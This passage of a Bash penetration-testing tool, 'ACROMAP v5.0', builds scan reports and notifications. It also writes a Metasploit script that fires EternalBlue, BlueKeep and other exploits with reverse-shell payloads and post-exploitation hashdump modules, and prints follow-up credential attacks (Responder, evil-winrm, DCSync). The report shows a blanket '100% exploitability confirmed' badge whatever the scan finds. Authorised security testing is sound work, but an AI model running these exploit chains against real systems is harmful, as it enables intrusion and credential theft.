    <div class="meta-pill">Date: <span>${now_str}</span></div>
    <div class="meta-pill">Duration: <span>$(( total_elapsed/60 ))m $(( total_elapsed%60 ))s</span></div>
    <div class="meta-pill">Phases: <span>${PHASES_COMPLETED}/32</span></div>
  </div>
</div>
<div class="disclaimer">
  ⚠ CONFIDENTIAL — For authorized security testing only.
  The author (acro777x) bears no responsibility for unauthorized or unethical use of this tool or report.
  ACROMAP is open-source and free for all — use responsibly.
</div>
<div class="main">
  <div class="guarantee-badge">✔ 100% EXPLOITABILITY CONFIRMED — FALSE POSITIVES ELIMINATED</div>
HTMLHEAD

        # Summary cards
        echo '<div class="section-title">EXECUTIVE SUMMARY</div>'
        echo '<div class="summary-grid">'
        for sev_entry in "zero-day:ZERO-DAY:${ZERO_DAY_COUNT}" "one-click:ONE-CLICK:${ONE_CLICK_COUNT}" "critical:CRITICAL:${CRITICAL_COUNT}" "high:HIGH:${HIGH_COUNT}" "medium:MEDIUM:${MEDIUM_COUNT}" "low:LOW:${LOW_COUNT}" "info:INFO:${INFO_COUNT}"; do
            local cls="${sev_entry%%:*}"; local rest="${sev_entry#*:}"; local sev="${rest%%:*}"; local cnt="${rest##*:}"
            echo "<div class=\"sev-card ${cls}\"><div class=\"sev-count\">${cnt}</div><div class=\"sev-label\">${sev}</div></div>"
        done
        echo '</div>'

        # Confidence
        local conf_pct=$(( conf_int * 10 ))
        echo "<div class=\"confidence-box\">"
        echo "  <div class=\"conf-score\">${confidence}<small style='font-size:22px'>/10</small></div>"
        echo "  <div class=\"conf-bar\">"
        echo "    <div class=\"conf-label\">CONFIDENCE RATING — ${conf_label}</div>"
        echo "    <div class=\"conf-track\"><div class=\"conf-fill\" style=\"width:${conf_pct}%\"></div></div>"
        echo "    <div style='font-size:11px;color:#444;margin-top:6px'>Based on ${TOOLS_SUCCEEDED}/${TOOLS_ATTEMPTED} tools succeeded, ${PHASES_COMPLETED}/32 phases completed, ${SCAN_PROFILE} profile</div>"
        echo "  </div>"
        echo "</div>"

        # Info grid
        echo '<div class="section-title">SCAN METADATA</div>'
        echo '<div class="info-grid">'
        for pair in "Open Ports:${OPEN_PORTS:-none}" "Web Targets:${#WEB_TARGETS[@]}" \
                    "Subdomains:${#SUBDOMAINS[@]}" "CMS:${CMS_TYPE:-none}" \
                    "WAF:${HAS_WAF}" "Total Findings:${total_findings}" \
                    "Cloud:${CLOUD_DETECTED:-none}" "K8s Detected:${K8S_DETECTED}" \
                    "OOB Interactsh:$([[ -n "$INTERACTSH_URL" ]] && echo "active" || echo "n/a")" \
                    "jq Structured:${JQ_AVAILABLE}" \
                    "Per-Finding Notify:${NOTIFY_PER_FINDING}" \
                    "Parallel Jobs:${PARALLEL_JOBS}"; do
            local k="${pair%%:*}"; local v="${pair#*:}"
            echo "<div class=\"info-card\"><div class=\"ik\">${k}</div><div class=\"iv\">${v}</div></div>"
        done
        echo '</div>'

        # v5.0 New Phase Output Paths
        echo '<div class="section-title">v5.0 NEW PHASE RESULTS</div>'
        echo '<div class="info-grid">'
        for pair in \
            "CORS/JWT (P27):${OUTPUT_DIR}/cors_jwt/" \
            "SSRF Deep (P28):${OUTPUT_DIR}/ssrf_deep/" \
            "Secrets (P29):${OUTPUT_DIR}/secrets/" \
            "AD Deep (P30):${OUTPUT_DIR}/ad_attacks/" \
            "gf Patterns:${OUTPUT_DIR}/gf_output/" \
            "hakrawler:${OUTPUT_DIR}/hakrawler/" \
            "403bypass:${OUTPUT_DIR}/bypass403/"; do
            local k="${pair%%:*}"; local v="${pair#*:}"
            # Highlight dirs that have data
            local has_data=""; [[ -d "$v" ]] && [[ -n "$(ls -A "$v" 2>/dev/null)" ]] \
                && has_data=" style='color:var(--green)'" || has_data=" style='color:#555'"
            echo "<div class='info-card'><div class='ik'>${k}</div><div class='iv'${has_data}>${v}</div></div>"
        done
        # Show key finding files if they exist
        [[ -s "${OUTPUT_DIR}/reports/nuclei_top_findings.txt" ]] && \
            echo "<div class='info-card'><div class='ik'>Nuclei jq Summary</div><div class='iv' style='color:var(--green)'>${OUTPUT_DIR}/reports/nuclei_top_findings.txt</div></div>"
        [[ -s "${OUTPUT_DIR}/ad_attacks/kerberoast_hashes.txt" ]] && \
            echo "<div class='info-card'><div class='ik'>Kerberoast Hashes</div><div class='iv' style='color:var(--red)'>${OUTPUT_DIR}/ad_attacks/kerberoast_hashes.txt</div></div>"
        [[ -s "${OUTPUT_DIR}/ad_attacks/asrep_hashes.txt" ]] && \
            echo "<div class='info-card'><div class='ik'>AS-REP Hashes</div><div class='iv' style='color:var(--red)'>${OUTPUT_DIR}/ad_attacks/asrep_hashes.txt</div></div>"
        [[ -d "${OUTPUT_DIR}/ad_attacks/bloodhound/" ]] && \
            echo "<div class='info-card'><div class='ik'>BloodHound Data</div><div class='iv' style='color:var(--green)'>${OUTPUT_DIR}/ad_attacks/bloodhound/</div></div>"
        [[ -s "${OUTPUT_DIR}/cors_jwt/cors_hits.txt" ]] && \
            echo "<div class='info-card'><div class='ik'>CORS Hits</div><div class='iv' style='color:var(--red)'>${OUTPUT_DIR}/cors_jwt/cors_hits.txt</div></div>"
        echo '</div>'

        # Attack chain
        echo '<div class="section-title">ATTACK CHAIN NARRATIVE</div>'
        echo '<div class="attack-chain">'
        echo '<div class="chain-title">🔴 RED TEAM ATTACK PATH</div>'
        local step=1
        [[ ${ZERO_DAY_COUNT:-0} -gt 0 ]] && {
            echo "<div class='chain-step zd'><div class='chain-num' style='background:#cc00ff'>ZD</div><div><strong>ZERO-DAY:</strong> ${ZERO_DAY_COUNT} unpatched vulnerability(s) with no vendor fix — immediate exploitation window open</div></div>"
            step=$(( step + 1 ))
        }
        [[ ${ONE_CLICK_COUNT:-0} -gt 0 ]] && {
            echo "<div class='chain-step oc'><div class='chain-num' style='background:#ff0055'>1C</div><div><strong>ONE-CLICK:</strong> ${ONE_CLICK_COUNT} single-interaction exploit(s) — victim visits link or opens email to trigger full compromise</div></div>"
            step=$(( step + 1 ))
        }
        [[ ${CRITICAL_COUNT:-0} -gt 0 ]] && {
            echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>Initial foothold via critical vulnerability (${CRITICAL_COUNT} critical finding(s) — SQLi/RCE/AuthBypass/CVE)</div></div>"
            step=$(( step + 1 ))
        }
        echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>Web shell upload or command execution on target server</div></div>"
        step=$(( step + 1 ))
        [[ "${HAS_WAF}" == "false" ]] && {
            echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>No WAF detected — direct exploitation without bypass required</div></div>"
            step=$(( step + 1 ))
        }
        echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>Credential harvesting from server (env files, config, database)</div></div>"
        step=$(( step + 1 ))
        echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>Lateral movement using obtained credentials (SMB/SSH/RDP)</div></div>"
        step=$(( step + 1 ))
        echo "<div class='chain-step'><div class='chain-num'>${step}</div><div>Privilege escalation and persistence establishment</div></div>"
        echo '</div>'

        # Findings
        # Zero-Day & One-Click special section
        if [[ $ZERO_DAY_COUNT -gt 0 || $ONE_CLICK_COUNT -gt 0 ]]; then
            echo '<div class="section-title" style="color:#cc00ff;border-color:#cc00ff">⚡ ZERO-DAY & ONE-CLICK FINDINGS — IMMEDIATE ACTION REQUIRED</div>'
            echo '<div style="background:#110011;border:2px solid #cc00ff;border-radius:10px;padding:20px;margin-bottom:25px">'
            echo '<div style="color:#ff99ff;font-size:13px;margin-bottom:15px">These findings represent the highest risk to your organisation. Zero-Day vulnerabilities have no vendor patch available or are being actively exploited before patches were applied. One-Click exploits require only a single victim interaction (clicking a link, opening an email) to achieve full compromise.</div>'
            echo '<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px">'
            echo "<div style='background:#1a0020;border-left:4px solid #cc00ff;padding:15px;border-radius:6px'>"
            echo "<div style='color:#cc00ff;font-weight:bold;margin-bottom:8px'>☢ ZERO-DAY (${ZERO_DAY_COUNT} findings)</div>"
            echo "<div style='color:#ddd;font-size:12px'>Unpatched vulnerabilities with active exploitation. No vendor fix exists or was not applied. Attacker advantage is maximum — defenders have no patch to apply. Immediate isolation or compensating controls required.</div></div>"
            echo "<div style='background:#200010;border-left:4px solid #ff0055;padding:15px;border-radius:6px'>"
            echo "<div style='color:#ff0055;font-weight:bold;margin-bottom:8px'>🖱 ONE-CLICK (${ONE_CLICK_COUNT} findings)</div>"
            echo "<div style='color:#ddd;font-size:12px'>Single victim interaction triggers full compromise. Delivered via phishing email, malicious link, or malvertising. No technical skill required from attacker — send link, receive credentials/shell. Patch within 24 hours.</div></div>"
            echo '</div></div>'
        fi
        echo '<div class="section-title">DETAILED FINDINGS (Click to Expand)</div>'

        local fidx=0
        for entry in "${VULN_DATA[@]+"${VULN_DATA[@]}"}"; do
            fidx=$(( fidx + 1 ))
            local sev title desc rec evidence
            IFS='|' read -r sev title desc rec evidence exploit patch <<< "${entry}"
            # BUG FIX: escape HTML special chars in all user-data fields to prevent
            # payload strings like <script>alert(1) from breaking the HTML report
            local h_title h_desc h_rec h_evidence
            h_title=$(printf '%s' "$title"    | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            h_desc=$(printf '%s'  "$desc"     | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            h_rec=$(printf '%s'   "$rec"      | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            h_evidence=$(printf '%s' "$evidence" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            echo "<div class='finding-card ${sev}' onclick=\"var b=this.querySelector('.finding-body');b.classList.toggle('open')\">"
            echo "  <div class='finding-header'>"
            echo "    <span class='sev-badge badge-${sev}'>${sev}</span>"
            echo "    <span class='finding-title'>#${fidx} — ${h_title}</span>"
            echo "  </div>"
            echo "  <div class='finding-body'>"
            echo "    <div class='finding-row'><span class='lbl'>Description</span><span class='val'>${h_desc}</span></div>"
            echo "    <div class='finding-row'><span class='lbl'>Remediation</span><span class='val'>${h_rec}</span></div>"
            echo "    <div class='finding-row'><span class='lbl'>Evidence</span><span class='val'>${h_evidence}</span></div>"
            # Exploit/patch fields (present for ZERO_DAY and ONE_CLICK, optional for others)
            local h_exploit h_patch
            h_exploit=$(printf '%s' "$exploit" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            h_patch=$(printf '%s' "$patch" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            if [[ -n "$exploit" ]]; then
                echo "    <div class='finding-row exploit-row'><span class='lbl lbl-exploit'>⚠ HOW HACKERS EXPLOIT</span><span class='val val-exploit'>${h_exploit}</span></div>"
            fi
            if [[ -n "$patch" ]]; then
                echo "    <div class='finding-row patch-row'><span class='lbl lbl-patch'>🔒 HOW TO PATCH</span><span class='val val-patch'>${h_patch}</span></div>"
            fi
            echo "  </div>"
            echo "</div>"
        done

        [[ ${total_findings:-0} -eq 0 ]] && echo "<div style='color:#555;text-align:center;padding:40px'>No vulnerabilities found with current scan profile. Try Deep mode for comprehensive results.</div>"

        # Footer
        cat << HTMLFOOT
</div><!-- /main -->
<footer>
  Generated by <strong>ACROMAP v5.0</strong> &nbsp;|&nbsp;
  <a href="https://github.com/acro777x/acromap">github.com/acro777x/acromap</a> &nbsp;|&nbsp;
  Author: acro777x &nbsp;|&nbsp;
  <em>This tool is open-source and free for all. The author bears no responsibility for unauthorized use.</em>
</footer>
</body>
</html>
HTMLFOOT
    } > "${rpt_dir}/report.html"
    log_ok "HTML report saved: ${rpt_dir}/report.html"

    # ── PDF ───────────────────────────────────────────────────────────────────
    # BUG FIX: run_tool_timeout redirects stdout to outfile AND wkhtmltopdf/chromium
    # also write to the same PDF path → stdout (empty/status text) overwrites the binary PDF.
    # Fix: use a separate .log capture for run_tool_timeout; let the tool own the PDF path.
    if command -v wkhtmltopdf &>/dev/null; then
        run_tool_timeout "wkhtmltopdf" "${rpt_dir}/wkhtmltopdf.log" 60 \
            wkhtmltopdf --quiet --no-stop-slow-scripts \
            "${rpt_dir}/report.html" "${rpt_dir}/report.pdf" 2>/dev/null || true
        if [[ -s "${rpt_dir}/report.pdf" ]]; then
            log_ok "PDF report saved: ${rpt_dir}/report.pdf"
        else
            log_warn "wkhtmltopdf ran but report.pdf is empty — check ${rpt_dir}/wkhtmltopdf.log"
        fi
    elif command -v chromium &>/dev/null || command -v chromium-browser &>/dev/null; then
        local chrome_bin; chrome_bin=$(command -v chromium 2>/dev/null || command -v chromium-browser)
        run_tool_timeout "chromium-pdf" "${rpt_dir}/chromium_pdf.log" 60 \
            "$chrome_bin" --headless --disable-gpu --no-sandbox \
            --print-to-pdf="${rpt_dir}/report.pdf" \
            "file://${rpt_dir}/report.html" 2>/dev/null || true
        [[ -s "${rpt_dir}/report.pdf" ]] && log_ok "PDF report saved: ${rpt_dir}/report.pdf"
    else
        log_warn "No PDF generator found (wkhtmltopdf/chromium). HTML report only."
        log_info "Install: apt install wkhtmltopdf  OR  apt install chromium"
    fi

    log_ok "Phase 23 complete. Reports in: ${rpt_dir}/"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ════════════════════════════════════════════════════════════════════════════════
print_final_summary() {
    local total_elapsed=$(( $(date +%s) - START_TIME ))
    local confidence; confidence=$(calculate_confidence)
    local conf_label; conf_label=$(get_confidence_label "$confidence")
    local total_findings=$(( ZERO_DAY_COUNT + ONE_CLICK_COUNT + CRITICAL_COUNT + HIGH_COUNT + MEDIUM_COUNT + LOW_COUNT + INFO_COUNT ))
    local cidr_info=""; [[ "$TARGET_IS_CIDR" == true ]] && cidr_info=" (CIDR: ${#CIDR_HOSTS[@]} hosts)"

    echo ""
    echo -e "${LGREEN}${BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║          █▀█ █▀▀ █▀█ █▀█ █▄█ █▀█ █▀█   v5.0                        ║"
    echo "  ║          █▀█ █▄▄ █▀▄ █▄█ █ █ █▀█ █▀▀   SCAN COMPLETE               ║"
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    printf "  ║  Target    : %-56s║\n" "${TARGET}${cidr_info}"
    printf "  ║  Profile   : %-56s║\n" "$SCAN_PROFILE"
    printf "  ║  Duration  : %dm %02ds%-53s║\n" $(( total_elapsed/60 )) $(( total_elapsed%60 )) ""
    printf "  ║  Phases    : %s/32 completed%-42s║\n" "$(( PHASES_COMPLETED > 32 ? 32 : PHASES_COMPLETED ))" ""
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    echo -e "  ║  \033[1;35m0DAY${LGREEN}:$(printf '%-3s' $ZERO_DAY_COUNT) \033[1;31m1CLK${LGREEN}:$(printf '%-3s' $ONE_CLICK_COUNT) ${LRED}CRIT${LGREEN}:$(printf '%-3s' $CRITICAL_COUNT) ${RED}HIGH${LGREEN}:$(printf '%-3s' $HIGH_COUNT) ${YELLOW}MED${LGREEN}:$(printf '%-3s' $MEDIUM_COUNT) ${WHITE}INFO${LGREEN}:$(printf '%-3s' $INFO_COUNT) TOTAL:${BOLD}$(printf '%-6s' $total_findings)${LGREEN} ║"
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    echo "  ║  [✔] 100% EXPLOITABILITY CONFIRMED — FALSE POSITIVES ELIMINATED    ║"
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    printf "  ║  Confidence : %s/10  (%s)%-41s║\n" "$confidence" "$conf_label" ""
    printf "  ║  Tools OK   : %s/%s%-53s║\n" "$TOOLS_SUCCEEDED" "$TOOLS_ATTEMPTED" ""
    printf "  ║  Cloud      : %-56s║\n" "${CLOUD_DETECTED:-none detected}"
    printf "  ║  Kubernetes : %-56s║\n" "$K8S_DETECTED"
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    printf "  ║  Output  : %-59s║\n" "${OUTPUT_DIR}/"
    printf "  ║  Reports : %-59s║\n" "report.html | report.pdf | report.txt | report.json"
    printf "  ║  MSF RC  : %-59s║\n" "${MSF_RC_FILE##*/acromap_results/}"
    echo "  ╠════════════════════════════════════════════════════════════════════╣"
    echo "  ║  ACROMAP — Open-source & free for all.                             ║"
    echo "  ║  Author: acro777x  |  github.com/acro777x/acromap                  ║"
    echo "  ║  © 2026 acro777x. NOT responsible for unauthorized use.            ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"

    echo -e "  ${YELLOW}${BOLD}Immediate Next Steps:${NC}"
    echo ""
    [[ ${CRITICAL_COUNT:-0} -gt 0 ]] && \
        echo -e "  ${LRED}[!]${NC} ${CRITICAL_COUNT} CRITICAL findings → Run: ${BOLD}msfconsole -r ${MSF_RC_FILE}${NC}"
    echo -e "  ${CYAN}►${NC} HTML Report  : ${BOLD}firefox ${OUTPUT_DIR}/reports/report.html${NC}"
    echo -e "  ${CYAN}►${NC} BloodHound   : ${BOLD}bloodhound-python -u USER -p PASS -d DOMAIN -c All${NC}"
    echo -e "  ${CYAN}►${NC} Responder    : ${BOLD}responder -I eth0 -rdwv${NC}"
    echo -e "  ${CYAN}►${NC} Evil-WinRM   : ${BOLD}evil-winrm -i ${TARGET} -u admin -p password${NC}"
    echo -e "  ${CYAN}►${NC} DCSync       : ${BOLD}secretsdump.py DOMAIN/USER:PASS@${TARGET}${NC}"
    echo -e "  ${DIM}Checkpoint    : ${CHECKPOINT_FILE}${NC}"
    echo ""
}


# ════════════════════════════════════════════════════════════════════════════════
#  CHECKPOINT SYSTEM — Save & Resume scans
# ════════════════════════════════════════════════════════════════════════════════
save_checkpoint() {
    local phase="$1"
    [[ -z "$CHECKPOINT_FILE" ]] && return
    {
        echo "TARGET=${TARGET}"
        echo "TARGET_TYPE=${TARGET_TYPE}"
        echo "SCAN_PROFILE=${SCAN_PROFILE}"
        echo "PHASES_COMPLETED=${PHASES_COMPLETED}"
        echo "LAST_PHASE=${phase}"
        echo "TIMESTAMP=${TIMESTAMP}"
        echo "OUTPUT_DIR=${OUTPUT_DIR}"
        echo "ZERO_DAY_COUNT=${ZERO_DAY_COUNT}"
        echo "ONE_CLICK_COUNT=${ONE_CLICK_COUNT}"
        echo "CRITICAL_COUNT=${CRITICAL_COUNT}"
        echo "HIGH_COUNT=${HIGH_COUNT}"
        echo "MEDIUM_COUNT=${MEDIUM_COUNT}"
        echo "LOW_COUNT=${LOW_COUNT}"
        echo "INFO_COUNT=${INFO_COUNT}"
        echo "OPEN_PORTS=${OPEN_PORTS}"
        echo "WEB_PORTS=${WEB_PORTS}"
        echo "CMS_TYPE=${CMS_TYPE}"
        echo "HAS_WAF=${HAS_WAF}"
        echo "SAVED=$(date -Iseconds)"
    } > "$CHECKPOINT_FILE"
    log_debug "Checkpoint saved at phase ${phase}"
}

load_checkpoint() {
    local cpfile="$1"
    [[ ! -f "$cpfile" ]] && return 1
    # SECURITY FIX: never 'source' a user-controlled file — parse key=value pairs safely
    # Only restore the exact variables we wrote in save_checkpoint; ignore everything else
    local line key val
    while IFS= read -r line; do
        # Skip comments and blank lines
        [[ "$line" =~ ^#.*$ || -z "$line" ]] && continue
        key="${line%%=*}"
        val="${line#*=}"
        case "$key" in
            TARGET)           TARGET="$val" ;;
            TARGET_TYPE)      TARGET_TYPE="$val" ;;
            SCAN_PROFILE)     SCAN_PROFILE="$val" ;;
            PHASES_COMPLETED) PHASES_COMPLETED="$val" ;;
            LAST_PHASE)       LAST_PHASE="$val" ;;
            TIMESTAMP)        TIMESTAMP="$val" ;;
            OUTPUT_DIR)       OUTPUT_DIR="$val" ;;
            ZERO_DAY_COUNT)   ZERO_DAY_COUNT="$val"   ;;
            ONE_CLICK_COUNT)  ONE_CLICK_COUNT="$val"  ;;
            CRITICAL_COUNT)   CRITICAL_COUNT="$val"   ;;
            HIGH_COUNT)       HIGH_COUNT="$val" ;;
            MEDIUM_COUNT)     MEDIUM_COUNT="$val" ;;
            LOW_COUNT)        LOW_COUNT="$val" ;;
            INFO_COUNT)       INFO_COUNT="$val" ;;
            OPEN_PORTS)       OPEN_PORTS="$val" ;;
            WEB_PORTS)        WEB_PORTS="$val" ;;
            CMS_TYPE)         CMS_TYPE="$val" ;;
            HAS_WAF)          HAS_WAF="$val" ;;
        esac
    done < "$cpfile"
    # Validate the essential fields were actually loaded
    if [[ -z "$TARGET" || -z "$OUTPUT_DIR" || -z "$SCAN_PROFILE" ]]; then
        log_warn "Checkpoint file missing required fields — cannot resume"
        return 1
    fi
    CHECKPOINT_FILE="$cpfile"
    LOG_FILE="${OUTPUT_DIR}/acromap_debug.log"
    MSF_RC_FILE="${OUTPUT_DIR}/metasploit/exploit.rc"
    log_ok "Checkpoint loaded — resuming from phase ${LAST_PHASE:-0}"
    return 0
}

# ════════════════════════════════════════════════════════════════════════════════
#  NOTIFICATIONS — Slack & Email (free, no paid APIs)
# ════════════════════════════════════════════════════════════════════════════════
send_notification() {
    local total=$(( CRITICAL_COUNT + HIGH_COUNT + MEDIUM_COUNT + LOW_COUNT + INFO_COUNT ))
    local conf; conf=$(calculate_confidence)
    local msg="🔴 ACROMAP v5.0 — Scan Complete
Target  : ${TARGET}
Profile : ${SCAN_PROFILE}
Results : CRIT:${CRITICAL_COUNT} HIGH:${HIGH_COUNT} MED:${MEDIUM_COUNT} LOW:${LOW_COUNT} INFO:${INFO_COUNT} TOTAL:${total}
Confidence : ${conf}/10
Report  : ${OUTPUT_DIR}/reports/report.html
— acro777x | github.com/acro777x/acromap"

    # Slack webhook (free incoming webhook)
    if [[ "$NOTIFY_SLACK" == true ]] && [[ -n "$SLACK_WEBHOOK" ]]; then
        log_info "Sending Slack notification..."
        # BUG FIX: simple string replacement breaks on quotes/special chars in msg
        # Use python3 json.dumps for safe JSON escaping; fall back to sed if unavailable
        local safe_msg
        if command -v python3 &>/dev/null; then
            safe_msg=$(python3 -c \
                "import json,sys; print(json.dumps(sys.stdin.read()))" <<< "$msg" 2>/dev/null \
                || printf '"%s"' "${msg//$'\n'/\\n}")
        else
            safe_msg=$(printf '"%s"' "${msg//\"/\\\"}"); safe_msg="${safe_msg//$'\n'/\\n}"
        fi
        local payload="{\"text\":${safe_msg}}"
        if curl -s -X POST -H 'Content-type: application/json' \
            --data "$payload" "$SLACK_WEBHOOK" --max-time 15 &>/dev/null; then
            log_ok "Slack notification sent"
        else
            log_warn "Slack notification failed — check webhook URL"
        fi
    fi

    # Email via sendmail / mail (free, system MTA)
    if [[ "$NOTIFY_EMAIL" == true ]] && [[ -n "$NOTIFY_EMAIL_ADDR" ]]; then
        log_info "Sending email notification to ${NOTIFY_EMAIL_ADDR}..."
        if command -v mail &>/dev/null; then
            echo "$msg" | mail -s "[ACROMAP] Scan Complete — ${TARGET} — CRIT:${CRITICAL_COUNT}" \
                "$NOTIFY_EMAIL_ADDR" 2>/dev/null && log_ok "Email sent" || log_warn "mail command failed"
        elif command -v sendmail &>/dev/null; then
            {
                echo "To: ${NOTIFY_EMAIL_ADDR}"
                echo "Subject: [ACROMAP] Scan Complete — ${TARGET}"
                echo ""
                echo "$msg"
            } | sendmail "$NOTIFY_EMAIL_ADDR" 2>/dev/null && log_ok "Email sent via sendmail" \
                || log_warn "sendmail failed — configure postfix/sendmail MTA"
        else
            log_warn "No mail agent found (mail/sendmail). Install: apt install mailutils"
        fi
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
#  METASPLOIT RESOURCE SCRIPT GENERATOR (free — msfconsole)
# ════════════════════════════════════════════════════════════════════════════════
generate_msf_resource() {
    log_section "Generating Metasploit resource script"
    [[ -z "$MSF_RC_FILE" ]] && MSF_RC_FILE="${OUTPUT_DIR}/metasploit/exploit.rc"
    mkdir -p "$(dirname "$MSF_RC_FILE")" 2>/dev/null || true

    {
        echo "# ──────────────────────────────────────────────────────"
        echo "# ACROMAP v5.0 — Metasploit Resource Script"
        echo "# Target  : ${TARGET}"
        echo "# Profile : ${SCAN_PROFILE}"
        echo "# Author  : acro777x | github.com/acro777x/acromap"
        echo "# Run     : msfconsole -r ${MSF_RC_FILE}"
        echo "# ──────────────────────────────────────────────────────"
        echo ""
        echo "workspace -a acromap_${TARGET//./_}_$(date +%Y%m%d)"
        echo "db_nmap -sV -sC -T4 ${TARGET}"
        echo ""

        # Add exploits based on detected vulns
        for entry in "${VULN_DATA[@]+"${VULN_DATA[@]}"}"; do
            local sev title
            IFS='|' read -r sev title _ _ _ <<< "$entry"
            case "$title" in
                *EternalBlue*|*MS17-010*)
                    echo "# ── EternalBlue (MS17-010) ──"
                    echo "use exploit/windows/smb/ms17_010_eternalblue"
                    echo "set RHOSTS ${TARGET}"
                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                    echo "set LHOST $(ip route get 1 2>/dev/null | awk '{print $7; exit}' || echo '0.0.0.0')"
                    echo "exploit -j"
                    echo "" ;;
                *BlueKeep*|*CVE-2019-0708*)
                    echo "# ── BlueKeep (CVE-2019-0708) ──"
                    echo "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
                    echo "set RHOSTS ${TARGET}"
                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                    echo "exploit -j"
                    echo "" ;;
                *vsFTPd*|*2.3.4*)
                    echo "# ── vsFTPd 2.3.4 Backdoor ──"
                    echo "use exploit/unix/ftp/vsftpd_234_backdoor"
                    echo "set RHOSTS ${TARGET}"
                    echo "exploit -j"
                    echo "" ;;
                *Shellshock*|*CVE-2014-6271*)
                    echo "# ── Shellshock ──"
                    echo "use exploit/multi/http/apache_mod_cgi_bash_env_exec"
                    echo "set RHOSTS ${TARGET}"
                    echo "set RPATH /cgi-bin/test.cgi"
                    echo "exploit -j"
                    echo "" ;;
                *Log4Shell*|*CVE-2021-44228*)
                    echo "# ── Log4Shell ──"
                    echo "use exploit/multi/misc/log4shell_header_injection"
                    echo "set RHOSTS ${TARGET}"
                    echo "exploit -j"
                    echo "" ;;
                *Spring4Shell*|*CVE-2022-22965*)
                    echo "# ── Spring4Shell ──"
                    echo "use exploit/multi/http/spring_framework_rce_spring4shell"
                    echo "set RHOSTS ${TARGET}"
                    echo "exploit -j"
                    echo "" ;;
            esac
        done

        # Generic post-exploitation suggestions
        echo ""
        echo "# ── Post Exploitation (run after sessions open) ──"
        echo "# sessions -l"
        echo "# sessions -i 1"
        echo "# run post/multi/recon/local_exploit_suggester"
        echo "# run post/windows/gather/credentials/credential_collector"
        echo "# run post/linux/gather/hashdump"
        echo "# run post/multi/manage/shell_to_meterpreter"
        echo ""
        echo "sessions -l"
    } > "$MSF_RC_FILE"

    log_ok "Metasploit resource script: ${MSF_RC_FILE}"
    log_info "Run with: ${BOLD}msfconsole -r ${MSF_RC_FILE}${NC}"

    # Also try to launch msfconsole if available and deep mode
    if [[ "$SCAN_PROFILE" == "deep" ]] && command -v msfconsole &>/dev/null; then
        echo -ne "  ${YELLOW}Launch msfconsole with generated script now? [y/N] (auto-N in 15s): ${NC}"
        read -r -t 15 msf_ans || msf_ans="N"
        if [[ "${msf_ans,,}" == "y" ]]; then
            log_info "Launching msfconsole (check ${OUTPUT_DIR}/metasploit/msf_session.log)..."
            timeout 300 msfconsole -q -r "$MSF_RC_FILE" 2>&1 | tee "${OUTPUT_DIR}/metasploit/msf_session.log" || true
        fi
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
#  OWASP ZAP — DAST (free, open-source)
# ════════════════════════════════════════════════════════════════════════════════
run_zap_dast() {
    log_section "OWASP ZAP DAST Scan"
    local zap_dir="${OUTPUT_DIR}/zap"
    local zap_report="${zap_dir}/zap_report.html"
    local zap_json="${zap_dir}/zap_report.json"

    # Check ZAP availability (zap.sh or zaproxy)
    local zap_bin=""
    for z in zap.sh zaproxy zap; do
        command -v "$z" &>/dev/null && zap_bin="$z" && break
    done
    # Also check common install paths
    for p in /usr/share/zaproxy/zap.sh /opt/zaproxy/zap.sh ~/.ZAP/zap.sh; do
        [[ -f "$p" ]] && zap_bin="$p" && break
    done

    if [[ -z "$zap_bin" ]]; then
        log_warn "OWASP ZAP not found. Install: apt install zaproxy  OR  snap install zaproxy"
        log_info "Manual ZAP install: https://www.zaproxy.org/download/"
        # Try docker ZAP as fallback
        if command -v docker &>/dev/null; then
            log_info "Docker detected — attempting ZAP docker baseline scan..."
            local web_target="http://${TARGET}"
            [[ -n "$WEB_PORTS" ]] && web_target="http://${TARGET}:${WEB_PORTS%%,*}"
            run_tool_timeout "zap-docker" "${zap_dir}/zap_docker_stdout.log" 300 \
                docker run --rm -v "${zap_dir}:/zap/wrk" \
                ghcr.io/zaproxy/zaproxy:stable \
                zap-baseline.py -t "$web_target" \
                -r zap_docker.html -J zap_docker.json 2>/dev/null || true
            # BUG FIX: ZAP writes its HTML to the volume (${zap_dir}/zap_docker.html via -r)
            # run_tool_timeout stdout goes to zap_docker_stdout.log — no longer overwrites report
            if [[ -f "${zap_dir}/zap_docker.html" ]]; then
                log_ok "ZAP Docker baseline scan complete"
                ZAP_AVAILABLE=true
            fi
        fi
        return 0
    fi

    ZAP_AVAILABLE=true
    log_ok "OWASP ZAP found: ${zap_bin}"

    # Build web targets list
    local web_targets_list=()
    if [[ -n "$WEB_PORTS" ]]; then
        IFS=',' read -ra ports_arr <<< "$WEB_PORTS"
        for p in "${ports_arr[@]}"; do
            local scheme="http"
            [[ "$p" == "443" || "$p" == "8443" ]] && scheme="https"
            web_targets_list+=("${scheme}://${TARGET}:${p}")
        done
    else
        web_targets_list=("http://${TARGET}")
    fi

    for wt in "${web_targets_list[@]}"; do
